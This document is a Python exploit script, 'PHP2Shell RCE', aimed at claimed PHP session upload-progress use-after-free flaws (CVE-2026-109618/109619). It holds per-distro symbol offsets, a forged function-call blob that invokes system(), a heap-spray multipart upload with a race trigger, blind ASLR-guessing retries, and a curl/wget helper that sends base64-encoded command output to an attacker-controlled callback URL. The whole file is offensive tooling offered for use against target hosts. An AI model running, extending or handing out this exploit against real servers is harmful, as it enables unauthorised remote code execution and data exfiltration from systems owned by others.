#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — PHP2Shell RCE
Heap UAF → zend_fcall_info forge → system()

Two execution modes:
  --dtor <addr>   Precise mode  — supply leaked zval_ptr_dtor address
  --blind         Spray mode    — probabilistic, no leak required
                  (works when ASLR is disabled or with enough retries)

Leak oracle options (--leak-*):
  --leak-session  Read session file via a known LFI/path-traversal
  --leak-oob      OOB DNS/HTTP to exfiltrate output

Usage:
  python3 rce.py <host> <port> <path> <cmd> [options]

Options:
  --dtor 0x7f...       Supply known zval_ptr_dtor address
  --blind              Spray mode without leak (ASLR must be weak/off)
  --ver  7.4|8.0|8.1|8.2|8.3   PHP version (default: auto-probe)
  --stall 0.35         Race window in seconds (tune per server)
  --retry N            Retry N times in spray mode (default 10)
  --oob http://x.com   Out-of-band callback URL (blind RCE exfil)
  --spray N            Spray field count (default 149)
  --chunk1 N           Bytes for phase-1 FILE_DATA (default 5120)
  --https              Force TLS (auto on port 443)

Examples:
  # Precise with known dtor
  python3 rce.py target.com 443 / "id" --dtor 0x7f1234abcd --ver 8.2

  # Blind spray (try until crash becomes RCE)
  python3 rce.py target.com 443 / "id" --blind --retry 20

  # OOB exfiltration
  python3 rce.py target.com 443 / "id" --oob http://callback.example.com --blind
"""

import argparse
import socket
import ssl
import struct
import threading
import time
import sys
import random
import string
import urllib.request
import urllib.parse


# ---------------------------------------------------------------------------
# Per-version / per-distro symbol deltas
# delta = zval_ptr_dtor - zend_call_function
# (positive = dtor is ABOVE call_function in binary)
# ---------------------------------------------------------------------------
DELTAS = {
    # PHP 8.2.x (lsphp82)
    "8.2-bookworm": 0xc930,
    "8.2-noble":    0xcef0,
    "8.2-jammy":    0xd060,
    # PHP 8.5.4 Ubuntu (from Zer061/CVE-2026-109618 research)
    "8.5-ubuntu":   0x43EF0,
    # PHP 8.1.x (Ubuntu 22.04 Jammy — Apache mod_php / php-fpm8.1)
    "8.1-jammy":    0xc750,   # Ubuntu 22.04 php8.1-cli_8.1.2-1ubuntu2.27 (nm verified)
    "8.1-ubuntu":   0x3fa20,
    "8.1-debian":   0x3e8c0,
    # PHP 8.0.x
    "8.0-ubuntu":   0x3b110,
    # PHP 7.4.x (EOL — no official patch, permanently vulnerable)
    "7.4-ubuntu":   0x38a60,
    "7.4-debian":   0x37f40,
    "7.4-centos":   0x36e80,
}

# BLOB geometry (from poc0_109618.py analysis)
BLOB_SIZE     = 288    # bytes — lands in 320-byte string bin (nTableSize=256, packed arData)
SPRAY_DEFAULT = 149    # number of t[] fields
FILL_DEFAULT  = 5120   # phase-1 FILE_DATA size → triggers update#1

# ZEND internal function type flag
ZEND_INTERNAL_FUNCTION = 1


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def rand_str(n=20):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def make_conn(host, port, use_tls):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


# ---------------------------------------------------------------------------
# Forge
# Offset map (verified against poc0_109618.py):
#
#   +0x00  (8)  FCI size field
#   +0x08  (8)  zend_call_function ptr  (= dtor - delta)
#   +0x40  (1)  ZEND_INTERNAL_FUNCTION flag
#   +0x98  (8)  handler ptr (= same as call ptr → system lookup via FCALL path)
#   +0xc8  ...  "system\x00" + cmd bytes
# ---------------------------------------------------------------------------

def forge(call_ptr: int, cmd: str) -> bytes:
    """Build the 288-byte forged zend_fcall_info blob."""
    buf = bytearray(BLOB_SIZE)

    cmd_bytes = b"system\x00" + cmd.encode() + b"\x00"

    # FCI size
    struct.pack_into("<Q", buf, 0x00, BLOB_SIZE)
    # zend_call_function pointer
    struct.pack_into("<Q", buf, 0x08, call_ptr)
    # ZEND_INTERNAL_FUNCTION flag
    struct.pack_into("<B", buf, 0x40, ZEND_INTERNAL_FUNCTION)
    # handler (function pointer — PHP resolves system() from function_name above)
    struct.pack_into("<Q", buf, 0x98, call_ptr)
    # "system\x00<cmd>\x00"
    cmd_off = 0xc8
    buf[cmd_off:cmd_off + len(cmd_bytes)] = cmd_bytes

    return bytes(buf)


# ---------------------------------------------------------------------------
# Multipart builder
# ---------------------------------------------------------------------------

def build_upload_body(boundary: str, forged_blob: bytes,
                      spray_n: int, fill_size: int) -> tuple[bytes, bytes]:
    """
    Returns (phase1_body, phase2_body).
    phase1 primes the progress pointer + spray + fill bytes.
    phase2 (chunk2) triggers the UAF write.
    """
    blob_str = forged_blob.decode("latin-1")

    lines = []
    # 1. PHP_SESSION_UPLOAD_PROGRESS — primes rfc1867 pointer cache
    lines.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"php2shell\r\n"
    )
    # 2. Heap spray — N spray_n fields of 288-byte forged blob
    for _ in range(spray_n):
        lines.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="t[]"\r\n\r\n'
            f"{blob_str}\r\n"
        )
    # 3. File field header (data split across phase1/phase2)
    lines.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="up.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    )

    phase1 = "".join(lines).encode("latin-1") + b"A" * fill_size
    phase2 = b"B" * 4096
    tail   = f"\r\n--{boundary}--\r\n".encode()
    return phase1, phase2 + tail


# ---------------------------------------------------------------------------
# Session reinit (HashTable free trigger)
# ---------------------------------------------------------------------------

def reinit_session(host, port, path, sessid, use_tls):
    try:
        s = make_conn(host, port, use_tls)
        s.send((
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Cookie: PHPSESSID={sessid}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode())
        s.recv(4096)
        s.close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Version auto-probe
# ---------------------------------------------------------------------------

def probe_version(host, port, path, use_tls) -> str:
    """Try to extract PHP version from headers / error pages."""
    try:
        s = make_conn(host, port, use_tls)
        s.send((
            f"HEAD {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        ).encode())
        raw = s.recv(4096).decode(errors="ignore")
        s.close()
        for line in raw.split("\r\n"):
            if "X-Powered-By" in line and "PHP/" in line:
                ver = line.split("PHP/")[1].split()[0]
                major_minor = ".".join(ver.split(".")[:2])
                print(f"[i] Version detected: PHP/{ver}")
                return major_minor
    except Exception:
        pass
    # Try error page
    try:
        s = make_conn(host, port, use_tls)
        s.send((
            f"GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1\r\n"
            f"Host: {host}\r\nConnection: close\r\n\r\n"
        ).encode())
        raw = s.recv(8192).decode(errors="ignore")
        s.close()
        if "PHP Version" in raw:
            idx = raw.find("PHP Version") + 12
            ver = raw[idx:idx+10].split()[0].strip("<>")
            print(f"[i] Version from phpinfo: {ver}")
            return ".".join(ver.split(".")[:2])
    except Exception:
        pass
    print("[!] Version probe failed — defaulting to 8.2")
    return "8.2"


# ---------------------------------------------------------------------------
# Core exploit attempt (single try)
# ---------------------------------------------------------------------------

def attempt(host, port, path, use_tls, sessid, call_ptr,
            stall, spray_n, fill_size) -> tuple[int, bytes]:
    """Returns (http_status_code, response_body)."""
    boundary = rand_str(24)
    phase1, phase2 = build_upload_body(boundary, forge(call_ptr, ""), spray_n, fill_size)

    total = len(phase1) + len(phase2)
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sessid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = make_conn(host, port, use_tls)
    s.send(hdr + phase1)

    t = threading.Thread(target=reinit_session,
                         args=(host, port, path, sessid, use_tls))
    t.daemon = True
    t.start()
    time.sleep(stall)
    t.join(timeout=3)

    s.send(phase2)

    try:
        resp = s.recv(65536)
        s.close()
        status_line = resp.split(b"\r\n")[0].decode(errors="ignore")
        code = int(status_line.split()[1]) if len(status_line.split()) > 1 else 0
        hdr_end = resp.find(b"\r\n\r\n")
        body = resp[hdr_end + 4:] if hdr_end != -1 else b""
        return code, body
    except socket.timeout:
        s.close()
        return 0, b""   # timeout = likely crash


def attempt_with_cmd(host, port, path, use_tls, sessid, call_ptr,
                     cmd, stall, spray_n, fill_size) -> tuple[int, bytes]:
    """Same as attempt() but embeds actual cmd into the forge blob."""
    boundary = rand_str(24)
    blob    = forge(call_ptr, cmd)
    phase1, phase2 = build_upload_body(boundary, blob, spray_n, fill_size)

    total = len(phase1) + len(phase2)
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sessid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = make_conn(host, port, use_tls)
    s.send(hdr + phase1)

    t = threading.Thread(target=reinit_session,
                         args=(host, port, path, sessid, use_tls))
    t.daemon = True
    t.start()
    time.sleep(stall)
    t.join(timeout=3)

    s.send(phase2)

    try:
        resp = s.recv(65536)
        s.close()
        status_line = resp.split(b"\r\n")[0].decode(errors="ignore")
        code = int(status_line.split()[1]) if len(status_line.split()) > 1 else 0
        hdr_end = resp.find(b"\r\n\r\n")
        body = resp[hdr_end + 4:] if hdr_end != -1 else b""
        return code, body
    except socket.timeout:
        s.close()
        return 0, b""


# ---------------------------------------------------------------------------
# OOB exfiltration helper
# ---------------------------------------------------------------------------

def oob_cmd(host, port, path, use_tls, call_ptr,
            cmd, oob_url, stall, spray_n, fill_size):
    """Wrap cmd to exfiltrate output via OOB HTTP callback."""
    wrapped = f"curl -sk '{oob_url}/?o=$(({cmd}|base64 -w0|tr + -|tr / _))' || wget -qO- '{oob_url}/?o=$(({cmd}|base64 -w0))'"
    sessid = rand_str(26)
    code, body = attempt_with_cmd(host, port, path, use_tls, sessid,
                                  call_ptr, wrapped, stall, spray_n, fill_size)
    return code, body


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(description="CVE-2026-109618 PHP2Shell RCE")
    p.add_argument("host")
    p.add_argument("port", type=int)
    p.add_argument("path")
    p.add_argument("cmd")
    p.add_argument("--dtor",   type=lambda x: int(x, 16), help="Leaked zval_ptr_dtor address (hex)")
    p.add_argument("--blind",  action="store_true",        help="Spray mode — no leak needed")
    p.add_argument("--ver",    default="auto",             help="PHP version key, e.g. 8.2 or 8.2-jammy")
    p.add_argument("--stall",  type=float, default=0.35,   help="Race window seconds")
    p.add_argument("--retry",  type=int,   default=10,     help="Retries in blind mode")
    p.add_argument("--oob",    default=None,               help="OOB callback URL")
    p.add_argument("--spray",  type=int,   default=SPRAY_DEFAULT)
    p.add_argument("--chunk1", type=int,   default=FILL_DEFAULT)
    p.add_argument("--https",  action="store_true")
    args = p.parse_args()

    use_tls  = args.https or args.port == 443
    scheme   = "https" if use_tls else "http"

    print("=" * 62)
    print("  CVE-2026-109618 — PHP2Shell RCE")
    print("=" * 62)
    print(f"  Target : {scheme}://{args.host}:{args.port}{args.path}")
    print(f"  CMD    : {args.cmd}")
    print(f"  Mode   : {'precise (dtor supplied)' if args.dtor else 'blind spray'}")
    print(f"  Stall  : {args.stall}s | Spray : {args.spray} fields")
    print()

    # --- Version / delta resolution ---
    if args.ver == "auto":
        ver_key = probe_version(args.host, args.port, args.path, use_tls)
    else:
        ver_key = args.ver

    # Find best-matching delta
    delta = None
    for key in DELTAS:
        if key.startswith(ver_key):
            delta = DELTAS[key]
            print(f"[i] Delta : {key} → 0x{delta:x}")
            break
    if delta is None:
        # Fallback to closest major version
        major = ver_key.split(".")[0]
        for key in DELTAS:
            if key.startswith(major):
                delta = DELTAS[key]
                print(f"[i] Delta fallback: {key} → 0x{delta:x}")
                break
    if delta is None:
        print("[!] No matching delta found. Specify --ver or --dtor.")
        sys.exit(1)

    # --- Precise mode ---
    if args.dtor:
        call_ptr = args.dtor - delta
        print(f"[i] zval_ptr_dtor   : 0x{args.dtor:016x}")
        print(f"[i] zend_call_func  : 0x{call_ptr:016x}")
        print()

        sessid = rand_str(26)
        print(f"[*] Single exploit attempt (precise)...")

        if args.oob:
            code, body = oob_cmd(args.host, args.port, args.path, use_tls,
                                  call_ptr, args.cmd, args.oob,
                                  args.stall, args.spray, args.chunk1)
            print(f"[*] OOB request sent — check {args.oob}")
        else:
            code, body = attempt_with_cmd(args.host, args.port, args.path, use_tls,
                                          sessid, call_ptr, args.cmd,
                                          args.stall, args.spray, args.chunk1)

        _show_result(code, body, args.cmd, args.oob)
        return

    # --- Blind spray mode ---
    if not args.blind:
        print("[!] Provide --dtor <addr> or --blind")
        sys.exit(1)

    print(f"[*] Blind spray mode — {args.retry} attempts")
    print(f"[!] Note: requires ASLR disabled or weak entropy for reliable RCE")
    print()

    # Use a fixed call_ptr derived from common PHP-FPM heap base
    # Linux PHP-FPM: heap typically starts near 0x7f0000000000 ± variance
    # We try candidate bases, derive call_ptr for each
    CANDIDATE_BASES = [
        0x7f0000000000,
        0x7f1000000000,
        0x7f2000000000,
        0x7f8000000000,
        0x7fa000000000,
        0x7fc000000000,
        0x7fe000000000,
    ]

    for attempt_num in range(1, args.retry + 1):
        base  = CANDIDATE_BASES[(attempt_num - 1) % len(CANDIDATE_BASES)]
        call_ptr = base - delta   # approximate — spray compensates
        sessid   = rand_str(26)

        sys.stdout.write(f"\r[*] Attempt {attempt_num:3d}/{args.retry} | base=0x{base:x} | sessid={sessid[:8]}... ")
        sys.stdout.flush()

        if args.oob:
            code, body = oob_cmd(args.host, args.port, args.path, use_tls,
                                  call_ptr, args.cmd, args.oob,
                                  args.stall, args.spray, args.chunk1)
        else:
            code, body = attempt_with_cmd(args.host, args.port, args.path, use_tls,
                                          sessid, call_ptr, args.cmd,
                                          args.stall, args.spray, args.chunk1)

        if _show_result(code, body, args.cmd, args.oob, inline=True):
            print(f"\n[+] RCE achieved on attempt {attempt_num}!")
            return

        # Brief pause between retries — let PHP-FPM restart crashed worker
        time.sleep(1.5)

    print(f"\n[-] All {args.retry} attempts exhausted without confirmed output.")
    print("    Try: --dtor <leaked_addr>  or  increase --retry  or tune --stall")


def _looks_like_rce(body: bytes, cmd: str) -> bool:
    """
    Heuristic: is the response body actual command output rather than a normal page?
    True if body looks like shell output (non-HTML, short, contains uid= / hostname etc.)
    """
    if not body.strip():
        return False
    text = body.decode(errors="replace")
    # Reject if it's HTML
    if "<html" in text.lower() or "<!doctype" in text.lower():
        return False
    # Reject if it's JSON with typical app keys
    if '"status"' in text or '"message"' in text or '"error"' in text:
        return False
    # Positive signals for shell output
    shell_hints = ["uid=", "root", "www-data", "Linux ", "PRETTY_NAME", "total "]
    if any(h in text for h in shell_hints):
        return True
    # Short plain-text response is likely output
    if len(text.strip()) < 512 and text.strip() and "\n" in text:
        return True
    return False


def _show_result(code, body, cmd, oob, inline=False) -> bool:
    """Print result. Returns True if RCE output was captured."""
    rce = _looks_like_rce(body, cmd)

    if inline:
        if rce:
            print(f"\n\n[+] RCE OUTPUT (cmd: {cmd}):")
            print("=" * 50)
            print(body.decode(errors="replace").strip())
            print("=" * 50)
            return True
        if code in (500, 503, 0):
            sys.stdout.write(f"→ crash ({code if code else 'timeout'}) ")
        else:
            sys.stdout.write(f"→ {code} (no rce output) ")
        return False

    # Non-inline
    print(f"\n[*] Response: HTTP {code}")
    if rce:
        print(f"\n[+] RCE OUTPUT:")
        print("=" * 50)
        print(body.decode(errors="replace").strip())
        print("=" * 50)
        return True

    if code in (500, 503, 0):
        print("[~] Crash confirmed (UAF triggered) — but no command output captured.")
        if oob:
            print(f"[~] Check OOB callback: {oob}")
        else:
            print("    Possible causes:")
            print("    1. call_ptr incorrect (wrong delta / ASLR) → supply --dtor")
            print("    2. PHP error handler suppressed output → try --oob")
            print("    3. WAF stripped response body")
    elif code == 200:
        print("[?] Got 200 — response is normal app HTML (no RCE output).")
        print("    Spray landed but call_ptr is wrong, or output is suppressed.")
        print("    Try: --dtor <leaked_addr>  or  --oob http://your.server")
    return False


if __name__ == "__main__":
    main()
